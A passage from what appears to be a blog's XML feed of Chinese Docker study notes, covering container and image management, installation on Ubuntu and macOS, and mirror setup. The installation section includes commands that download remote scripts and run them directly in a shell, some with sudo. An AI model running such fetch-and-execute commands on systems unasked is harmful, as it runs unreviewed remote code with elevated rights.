2c047404e52d   3 months ago     63.3MB</code></pre></div><p>此外，也可以通过指定 URL 或者某个目录来导入，例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker import http:&#x2F;&#x2F;example.com&#x2F;exampleimage.tgz example&#x2F;imagerepo</code></pre></div><p><em>注：用户既可以使用</em> <em><code>docker load</code></em> <em>来导入镜像存储文件到本地镜像库，也可以使用</em> <em><code>docker import</code></em> <em>来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。</em></p><h2 id="6-删除容器"><a href="#6-删除容器" class="headerlink" title="6. 删除容器"></a>6. 删除容器</h2><p>可以使用 <code>docker container rm</code> 来删除一个处于终止状态的容器。例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container lsCONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMESbf85753fd26a   ubuntu    &quot;&#x2F;bin&#x2F;bash&quot;   43 minutes ago   Up 43 minutes             loving_tharp$ docker container rm bf85Error response from daemon: You cannot remove a running container bf85753fd26a3af4ee9a600dd41010e5f6f6ea2a7eb059dd017010d7f47f99b7. Stop the container before attempting removal or force remove$ docker container stop bf85bf85$ docker container rm bf85bf85</code></pre></div><p>如果要删除一个运行中的容器，可以添加 <code>-f</code> 参数。Docker 会发送 <code>SIGKILL</code> 信号给容器。</p><h3 id="清理所有处于终止状态的容器"><a href="#清理所有处于终止状态的容器" class="headerlink" title="清理所有处于终止状态的容器"></a>清理所有处于终止状态的容器</h3><p>用 <code>docker container ls -a</code> 命令可以查看所有已经创建的包括终止状态的容器，如果数量太多要一个个删除可能会很麻烦，用下面的命令可以清理掉所有处于终止状态的容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container prune</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Container</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——使用镜像</title>
    <link href="/posts/10030fa9/"/>
    <url>/posts/10030fa9/</url>
    
    <content type="html"><![CDATA[<h3 id="1-获取镜像"><a href="#1-获取镜像" class="headerlink" title="1. 获取镜像"></a>1. 获取镜像</h3><p>从 Docker 镜像仓库获取镜像的命令是 <code>docker pull</code>。其命令格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker pull [选项] [Docker Registry 地址[:端口号]&#x2F;]仓库名[:标签]</code></pre></div><p>具体的选项可以通过 <code>docker pull --help</code> 命令看到，这里我们说一下镜像名称的格式。</p><ul><li>Docker 镜像仓库地址：地址的格式一般是 <code>&lt;域名/IP&gt;[:端口号]</code>。默认地址是 Docker Hub(<code>docker.io</code>)。</li><li>仓库名：如之前所说，这里的仓库名是两段式名称，即 <code>&lt;用户名&gt;/&lt;软件名&gt;</code>。对于 Docker Hub，如果不给出用户名，则默认为 <code>library</code>，也就是官方镜像。</li></ul><p>比如：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker pull ubuntu:18.0418.04: Pulling from library&#x2F;ubuntu92dc2a97ff99: Pull completebe13a9d27eb8: Pull completec8299583700a: Pull completeDigest: sha256:4bc3ae6596938cb0d9e5ac51a1152ec9dcac2a1c50829c74abd9c4361e321b26Status: Downloaded newer image for ubuntu:18.04docker.io&#x2F;library&#x2F;ubuntu:18.04</code></pre></div><p>上面的命令中没有给出 Docker 镜像仓库地址，因此将会从 Docker Hub （<code>docker.io</code>）获取镜像。而镜像名称是 <code>ubuntu:18.04</code>，因此将会获取官方镜像 <code>library/ubuntu</code> 仓库中标签为 <code>18.04</code> 的镜像。<code>docker pull</code> 命令的输出结果最后一行给出了镜像的完整名称，即： <code>docker.io/library/ubuntu:18.04</code>。</p><p>从下载过程中可以看到表现出了分层存储的概念，镜像是由多层存储所构成。下载也是一层层的去下载，并非单一文件。</p><p>下载过程中给出了每一层的 ID 的前 12 位。并且下载结束后，给出该镜像完整的 <code>sha256</code> 的摘要，以确保下载一致性。</p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>有了镜像后，我们就能够以这个镜像为基础启动并运行一个容器。以上面的 <code>ubuntu:18.04</code> 为例，如果我们打算启动里面的 <code>bash</code> 并且进行交互式操作的话，可以执行下面的命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -it --rm ubuntu:18.04 bashroot@e7009c6ce357:&#x2F;# cat &#x2F;etc&#x2F;os-releaseNAME&#x3D;&quot;Ubuntu&quot;VERSION&#x3D;&quot;18.04.1 LTS (Bionic Beaver)&quot;ID&#x3D;ubuntuID_LIKE&#x3D;debianPRETTY_NAME&#x3D;&quot;Ubuntu 18.04.1 LTS&quot;VERSION_ID&#x3D;&quot;18.04&quot;HOME_URL&#x3D;&quot;https:&#x2F;&#x2F;www.ubuntu.com&#x2F;&quot;SUPPORT_URL&#x3D;&quot;https:&#x2F;&#x2F;help.ubuntu.com&#x2F;&quot;BUG_REPORT_URL&#x3D;&quot;https:&#x2F;&#x2F;bugs.launchpad.net&#x2F;ubuntu&#x2F;&quot;PRIVACY_POLICY_URL&#x3D;&quot;https:&#x2F;&#x2F;www.ubuntu.com&#x2F;legal&#x2F;terms-and-policies&#x2F;privacy-policy&quot;VERSION_CODENAME&#x3D;bionicUBUNTU_CODENAME&#x3D;bionic</code></pre></div><p><code>docker run</code> 就是运行容器的命令，简要的说明一下上面用到的参数（更多参数见“操作容器”一文）。</p><ul><li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 <code>bash</code> 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li><code>--rm</code>：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 <code>docker rm</code>。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 <code>--rm</code> 可以避免浪费空间。</li><li><code>ubuntu:18.04</code>：这是指用 <code>ubuntu:18.04</code> 镜像为基础来启动容器。</li><li><code>bash</code>：放在镜像名后的是 <strong>命令</strong>，这里我们希望有个交互式 Shell，因此用的是 <code>bash</code>。</li></ul><p>进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 <code>cat /etc/os-release</code>，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 <code>Ubuntu 18.04.1 LTS</code> 系统。</p><p>最后我们通过 <code>exit</code> 退出了这个容器。</p><h3 id="2-列出镜像"><a href="#2-列出镜像" class="headerlink" title="2. 列出镜像"></a>2. 列出镜像</h3><p>要想列出已经下载下来的镜像，可以使用 <code>docker image ls</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image lsREPOSITORY                TAG       IMAGE ID       CREATED        SIZEleex0&#x2F;docker101tutorial   latest    4c500ed7d6b5   28 hours ago   27.9MBdocker101tutorial         latest    4c500ed7d6b5   28 hours ago   27.9MBnginx                     latest    6084105296a9   9 days ago     133MBalpine&#x2F;git                latest    a939554ad0d0   4 weeks ago    25.1MB</code></pre></div><p>列表包含了 <code>仓库名</code>、<code>标签</code>、<code>镜像 ID</code>、<code>创建时间</code> 以及 <code>所占用的空间</code>。</p><p>其中仓库名、标签在之前的基础概念章节已经介绍过了。<strong>镜像 ID</strong> 则是镜像的唯一标识，一个镜像可以对应多个 <strong>标签</strong>。因此，在上面的例子中，我们可以看到 <code>ubuntu:18.04</code> 和 <code>ubuntu:bionic</code> 拥有相同的 ID，因为它们对应的是同一个镜像。</p><h4 id="镜像体积"><a href="#镜像体积" class="headerlink" title="镜像体积"></a>镜像体积</h4><p>使用 <code>docker image ls</code> 命令会与Docker Hub 上看到的镜像大小不同。因为Docker Hub上的镜像体积为压缩过的体积，方便网络传输。</p><p>另外一个需要注意的问题是，<code>docker image ls</code> 列表中的镜像体积总和并非是所有镜像实际硬盘消耗。由于 Docker 镜像是多层存储结构，并且可以继承、复用，因此不同镜像可能会因为使用相同的基础镜像，从而拥有共同的层。由于 Docker 使用 Union FS，相同的层只需要保存一份即可，因此实际镜像硬盘占用空间很可能要比这个列表镜像大小的总和要小的多。</p><p>你可以通过 <code>docker system df</code> 命令来便捷的查看镜像、容器、数据卷所占用的空间。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker system dfTYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLEImages          3         2         180.5MB   138.7MB (76%)Containers      2         0         1.114kB   1.114kB (100%)Local Volumes   1         1         10.24MB   0B (0%)Build Cache     32        0         395MB     395MB</code></pre></div><h4 id="虚悬镜像"><a href="#虚悬镜像" class="headerlink" title="虚悬镜像"></a>虚悬镜像</h4><p>此外有时还可以看到一个特殊的镜像，这个镜像既没有仓库名，也没有标签，均为 <code>&lt;none&gt;</code>。：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&lt;none&gt;               &lt;none&gt;              00285df0df87        5 days ago          342 MB</code></pre></div><p>这个镜像原本是有镜像名和标签的，原来为 <code>mongo:3.2</code>，随着官方镜像维护，发布了新版本后，重新 <code>docker pull mongo:3.2</code> 时，<code>mongo:3.2</code> 这个镜像名被转移到了新下载的镜像身上，而旧的镜像上的这个名称则被取消，从而成为了 <code>&lt;none&gt;</code>。除了 <code>docker pull</code> 可能导致这种情况，<code>docker build</code> 也同样可以导致这种现象。由于新旧镜像同名，旧镜像名称被取消，从而出现仓库名、标签均为 <code>&lt;none&gt;</code> 的镜像。这类无标签镜像也被称为 <strong>虚悬镜像(dangling image)</strong> ，可以用下面的命令专门显示这类镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image ls -f dangling&#x3D;trueREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE&lt;none&gt;              &lt;none&gt;              00285df0df87        5 days ago          342 MB</code></pre></div><p>一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image prune</code></pre></div><h4 id="中间层镜像"><a href="#中间层镜像" class="headerlink" title="中间层镜像"></a>中间层镜像</h4><p>为了加速镜像构建、重复利用资源，Docker 会利用 <strong>中间层镜像</strong>。所以在使用一段时间后，可能会看到一些依赖的中间层镜像。默认的 <code>docker image ls</code> 列表中只会显示顶层镜像，如果希望显示包括中间层镜像在内的所有镜像的话，需要加 <code>-a</code> 参数。</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">$ docker image ls -a</code></pre></div><p>这些镜像在<code>-a</code>列出来后也无标签，但平时无需处理。删除依赖中间层镜像的镜像后，这些依赖的中间层镜像也会被连带删除。</p><h4 id="列出部分镜像"><a href="#列出部分镜像" class="headerlink" title="列出部分镜像"></a>列出部分镜像</h4><p>不加任何参数的情况下，<code>docker image ls</code> 会列出所有顶层镜像，但是有时候我们只希望列出部分镜像。<code>docker image ls</code> 有好几个参数可以帮助做到这个事情。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 根据仓库名列出镜像$ docker image ls ubuntuREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEubuntu              18.04               329ed837d508        3 days ago          63.3MBubuntu              bionic              329ed837d508        3 days ago          63.3MB# 列出特定的某个镜像，也就是说指定仓库名和标签$ docker image ls ubuntu:18.04REPOSITORY          TAG                 IMAGE ID            CREATED             SIZEubuntu              18.04               329ed837d508        3 days ago          63.3MB# 除此以外，&#96;docker image ls&#96; 还支持强大的过滤器参数 &#96;--filter&#96;，或者简写 &#96;-f&#96;# 比如，之前查看虚悬镜像，或我们希望看到在 &#96;mongo:3.2&#96; 之后建立的镜像，可以用下面的命令：$ docker image ls -f since&#x3D;mongo:3.2REPOSITORY          TAG                 IMAGE ID            CREATED             SIZEredis               latest              5f515359c7f8        5 days ago          183 MBnginx               latest              05a60462f8ba        5 days ago          181 MB# 想查看某个位置之前的镜像也可以，只需要把 &#96;since&#96; 换成 &#96;before&#96; 即可。# 此外，如果镜像构建时，定义了 &#96;LABEL&#96;，还可以通过 &#96;LABEL&#96; 来过滤。$ docker image ls -f label&#x3D;com.example.version&#x3D;0.1...</code></pre></div><h5 id="以特定格式显示"><a href="#以特定格式显示" class="headerlink" title="以特定格式显示"></a>以特定格式显示</h5><p>比如，下面的命令会直接列出镜像结果，并且只包含镜像ID和仓库名：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image ls --format &quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;5f515359c7f8: redis05a60462f8ba: nginxfe9198c04d62: mongo00285df0df87: &lt;none&gt;329ed837d508: ubuntu329ed837d508: ubuntu</code></pre></div><p>或者打算以表格等距显示，并且有标题行，和默认一样，不过自己定义列：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image ls --format &quot;table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag&#125;&#125;&quot;IMAGE ID            REPOSITORY          TAG5f515359c7f8        redis               latest05a60462f8ba        nginx               latestfe9198c04d62        mongo               3.200285df0df87        &lt;none&gt;              &lt;none&gt;329ed837d508        ubuntu              18.04329ed837d508        ubuntu              bionic</code></pre></div><h3 id="3-删除本地镜像"><a href="#3-删除本地镜像" class="headerlink" title="3. 删除本地镜像"></a>3. 删除本地镜像</h3><p>如果要删除本地的镜像，可以使用 <code>docker image rm</code> 命令，其格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...]</code></pre></div><h4 id="用-ID、镜像名、摘要删除镜像"><a href="#用-ID、镜像名、摘要删除镜像" class="headerlink" title="用 ID、镜像名、摘要删除镜像"></a>用 ID、镜像名、摘要删除镜像</h4><p>其中，<code>&lt;镜像&gt;</code> 可以是 <code>镜像短 ID</code>、<code>镜像长 ID</code>、<code>镜像名</code> 或者 <code>镜像摘要</code>。</p><p>比如我们有这么一些镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image lsREPOSITORY    TAG       IMAGE ID       CREATED       SIZEhello-world   latest    d1165f221234   2 weeks ago   13.3kB</code></pre></div><p>我们可以用镜像的完整 ID，也称为 <code>长 ID</code>，来删除镜像。使用脚本的时候可能会用长 ID，但是人工输入就太累了，所以更多的时候是用 <code>短 ID</code> 来删除镜像。<code>docker image ls</code> 默认列出的就已经是短 ID 了，一般取前3个字符以上，只要足够区分于别的镜像就可以了。</p><p>比如这里，如果我们要删除 <code>redis:alpine</code> 镜像，可以执行：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm d11Untagged: hello-world:latestUntagged: hello-world@sha256:f1ed3708f538b537eb9c2a7dd50dc90a706f7debd7e1196c9264edeea521a86dDeleted: sha256:d11ad78535f015d88872e13fa87a828425117e3d28075d0c117932b05bf189b7Deleted: sha256:96167737e29ca8e9d74982ef2a0dda76ed7b430da55e321c071f0dbff8c2899bDeleted: sha256:32770d1dcf835f192cafd6b9263b7b597a1778a403a109e2cc2ee866f74adf23Deleted: sha256:127227698ad74a5846ff5153475e03439d96d4b1c7f2a449c7a826ef74a2d2faDeleted: sha256:1333ecc582459bac54e1437335c0816bc17634e131ea0cc48daa27d32c75eab3Deleted: sha256:4fc455b921edf9c4aea207c51ab39b10b06540c8b4825ba57b3feed1668fa7c7</code></pre></div><p>我们也可以用<code>镜像名</code>，也就是 <code>&lt;仓库名&gt;:&lt;标签&gt;</code>，来删除镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm hello-worldUntagged: hello-world:latestUntagged: hello-world@sha256:f1ed3708f538b537eb9c2a7dd50dc90a706f7debd7e1196c9264edeea521a86dDeleted: sha256:0584b3d2cf6d235ee310cf14b54667d889887b838d3f3d3033acd70fc3c48b8aDeleted: sha256:97ca462ad9eeae25941546209454496e1d66749d53dfa2ee32bf1faabd239d38</code></pre></div><h4 id="Untagged-和-Deleted"><a href="#Untagged-和-Deleted" class="headerlink" title="Untagged 和 Deleted"></a>Untagged 和 Deleted</h4><p>如果观察上面这几个命令的运行输出信息的话，你会注意到删除行为分为两类，一类是 <code>Untagged</code>，另一类是 <code>Deleted</code>。我们之前介绍过，镜像的唯一标识是其 ID 和摘要，而一个镜像可以有多个标签。</p><p>因此当我们使用上面命令删除镜像的时候，实际上是在要求删除某个标签的镜像。当该镜像所有的标签都被取消了，该镜像很可能会失去了存在的意义，因此会触发删除行为。</p><p>镜像是多层存储结构，因此在删除的时候也是从上层向基础层方向依次进行判断删除。镜像的多层结构让镜像复用变得非常容易，因此很有可能某个其它镜像正依赖于当前镜像的某一层。这种情况，依旧不会触发删除该层的行为。直到没有任何层依赖当前层时，才会真实的删除当前层。</p><p>除了镜像依赖以外，还需要注意的是容器对镜像的依赖。如果有用这个镜像启动的容器存在（即使容器没有运行），那么同样不可以删除这个镜像。如果这些容器是不需要的，应该先将它们删除，然后再来删除镜像。</p><h4 id="用-docker-image-ls-命令来配合"><a href="#用-docker-image-ls-命令来配合" class="headerlink" title="用 docker image ls 命令来配合"></a>用 docker image ls 命令来配合</h4><p>像其它可以承接多个实体的命令一样，可以使用 <code>docker image ls -q</code> 来配合使用 <code>docker image rm</code>，这样可以成批的删除希望删除的镜像。我们在“镜像列表”章节介绍过很多过滤镜像列表的方式都可以拿过来使用。</p><p>比如，我们需要删除所有仓库名为 <code>redis</code> 的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm $(docker image ls -q redis)</code></pre></div><p>或者删除所有在 <code>mongo:3.2</code> 之前的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image rm $(docker image ls -q -f before&#x3D;mongo:3.2)</code></pre></div><p>充分利用你的想象力和 Linux 命令行的强大，你可以完成很多非常赞的功能。</p><hr><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Image</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——概念与安装</title>
    <link href="/posts/adb8e54e/"/>
    <url>/posts/adb8e54e/</url>
    
    <content type="html"><![CDATA[<h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念</h2><p>Docker主要包括三个概念<strong>镜像</strong>、<strong>容器</strong>、<strong>仓库</strong>。</p><h3 id="镜像（Image）"><a href="#镜像（Image）" class="headerlink" title="镜像（Image）"></a><strong>镜像</strong>（<code>Image</code>）</h3><p>我们都知道，操作系统分为 <strong>内核</strong> 和 <strong>用户空间</strong>。对于 <code>Linux</code> 而言，内核启动后，会挂载 <code>root</code> 文件系统为其提供用户空间支持。而 <strong>Docker 镜像</strong>（<code>Image</code>），就相当于是一个 <code>root</code> 文件系统。比如官方镜像 <code>ubuntu:18.04</code> 就包含了完整的一套 Ubuntu 18.04 最小系统的 <code>root</code> 文件系统。</p><p><strong>Docker 镜像</strong> 是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像 <strong>不包含</strong> 任何动态数据，其内容在构建之后也不会被改变。</p><h3 id="容器（Container）"><a href="#容器（Container）" class="headerlink" title="容器（Container）"></a><strong>容器</strong>（<code>Container</code>）</h3><p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 <a href="https://en.wikipedia.org/wiki/Linux_namespaces">命名空间</a>。因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。</p><h3 id="仓库（Repository）"><a href="#仓库（Repository）" class="headerlink" title="仓库（Repository）"></a><strong>仓库</strong>（<code>Repository</code>）</h3><p>镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，<a href>Docker Registry</a> 就是这样的服务。</p><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库</strong>（<code>Repository</code>）；每个仓库可以包含多个 <strong>标签</strong>（<code>Tag</code>）；每个标签对应一个镜像。</p><p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <code>&lt;仓库名&gt;:&lt;标签&gt;</code> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <code>latest</code> 作为默认标签。</p><h3 id="Docker与传统虚拟化区别"><a href="#Docker与传统虚拟化区别" class="headerlink" title="Docker与传统虚拟化区别"></a>Docker与传统虚拟化区别</h3><p><img src="/posts/adb8e54e/virtualization.png" alt="virtualization"></p><p><img src="/posts/adb8e54e/docker.png" alt="docker"></p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2 安装"></a>2 安装</h2><h3 id="2-1-Ubuntu下安装"><a href="#2-1-Ubuntu下安装" class="headerlink" title="2.1 Ubuntu下安装"></a>2.1 Ubuntu下安装</h3><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get remove docker docker-engine docker.io</code></pre></div><h4 id="向-sources-list-中添加-Docker-软件源"><a href="#向-sources-list-中添加-Docker-软件源" class="headerlink" title="向 sources.list 中添加 Docker 软件源"></a>向 <code>sources.list</code> 中添加 Docker 软件源</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \  $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null# 官方源# echo \#   &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu \# $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null</code></pre></div><blockquote><p>以上命令会添加稳定版本的 Docker APT 镜像源，如果需要测试版本的 Docker 请将 stable 改为 test。</p></blockquote><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre></div><h4 id="使用脚本自动安装"><a href="#使用脚本自动安装" class="headerlink" title="使用脚本自动安装"></a>使用脚本自动安装</h4><p>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装，另外可以通过 <code>--mirror</code> 选项使用国内源进行安装：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># curl -fsSL test.docker.com -o get-docker.shcurl -fsSL get.docker.com -o get-docker.shsudo sh get-docker.sh --mirror Aliyun# sudo sh get-docker.sh --mirror AzureChinaCloud</code></pre></div><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo systemctl enable dockersudo systemctl start docker</code></pre></div><h4 id="建立-docker-用户组"><a href="#建立-docker-用户组" class="headerlink" title="建立 docker 用户组"></a>建立 docker 用户组</h4><p>默认情况下，<code>docker</code> 命令会使用 <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix socket</a> 与 Docker 引擎通讯。而只有 <code>root</code> 用户和 <code>docker</code> 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 <code>root</code> 用户。因此，更好地做法是将需要使用 <code>docker</code> 的用户加入 <code>docker</code> 用户组。</p><p>建立 <code>docker</code> 组：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo groupadd docker</code></pre></div><p>将当前用户加入 <code>docker</code> 组：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo usermod -aG docker $USER</code></pre></div><p>退出当前终端并重新登录，进行如下测试。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run --rm hello-world</code></pre></div><p>若能正常输出以上信息，则说明安装成功。</p><h3 id="2-2-MacOS下安装"><a href="#2-2-MacOS下安装" class="headerlink" title="2.2 MacOS下安装"></a>2.2 MacOS下安装</h3><p>使用brew即可进行快速安装</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew install --cask docker</code></pre></div><p>如果 <code>docker version</code>、<code>docker info</code> 都正常的话，可以尝试运行一个 <a href="https://hub.docker.com/_/nginx/">Nginx 服务器</a>：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run -d -p 80:80 --name webserver nginx</code></pre></div><p>服务运行后，可以访问 <a href="http://localhost/">http://localhost</a>，如果看到了 “Welcome to nginx!”，就说明 Docker Desktop for Mac 安装成功了。</p><h3 id="2-3-镜像加速"><a href="#2-3-镜像加速" class="headerlink" title="2.3 镜像加速"></a>2.3 镜像加速</h3><p>aliyun：<a href="https://www.aliyun.com/product/acr?source=5176.11533457&userCode=8lx5zmtu">阿里云加速器(点击管理控制台 -&gt; 登录账号(淘宝账号) -&gt; 左侧镜像中心 -&gt; 镜像加速器 -&gt; 复制地址)</a></p><p>DaoCloud：<a href="http://f1361db2.m.daocloud.io/">http://f1361db2.m.daocloud.io</a></p><ul><li>Ubuntu</li></ul><p>可在 <code>/etc/docker/daemon.json</code> 中写入如下内容（如果文件不存在请新建该文件）：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123;  &quot;registry-mirrors&quot;: [    &quot;https:&#x2F;&#x2F;hub-mirror.c.163.com&quot;,    &quot;https:&#x2F;&#x2F;mirror.baidubce.com&quot;  ]&#125;</code></pre></div><p>也可使用DaoCloud服务提供的一键换镜像站脚本：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;daotools&#x2F;set_mirror.sh | sh -s http:&#x2F;&#x2F;f1361db2.m.daocloud.io</code></pre></div><p>之后重新启动服务。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo systemctl daemon-reloadsudo systemctl restart docker</code></pre></div><ul><li>macOS</li></ul><p>对于使用 macOS 的用户，在任务栏点击 Docker Desktop 应用图标 -&gt; <code>Perferences</code>，在左侧导航菜单选择 <code>Docker Engine</code>，在右侧像上述Ubuntu中json一样编辑 json 文件。修改完成之后，点击 <code>Apply &amp; Restart</code> 按钮，Docker 就会重启并应用配置的镜像地址了。</p><ul><li>检查加速器生效</li></ul><p>执行<code>docker info</code>，若在结果中看到了如下则生效：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">Registry Mirrors: https:&#x2F;&#x2F;5503mc71.mirror.aliyuncs.com&#x2F;</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p><p><a href="https://www.daocloud.io/mirror#accelerator-doc">https://www.daocloud.io/mirror#accelerator-doc</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Ubuntu</tag>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>brew权限问题与Mac使用指定程序打开</title>
    <link href="/posts/1ffeecc0/"/>
    <url>/posts/1ffeecc0/</url>
    
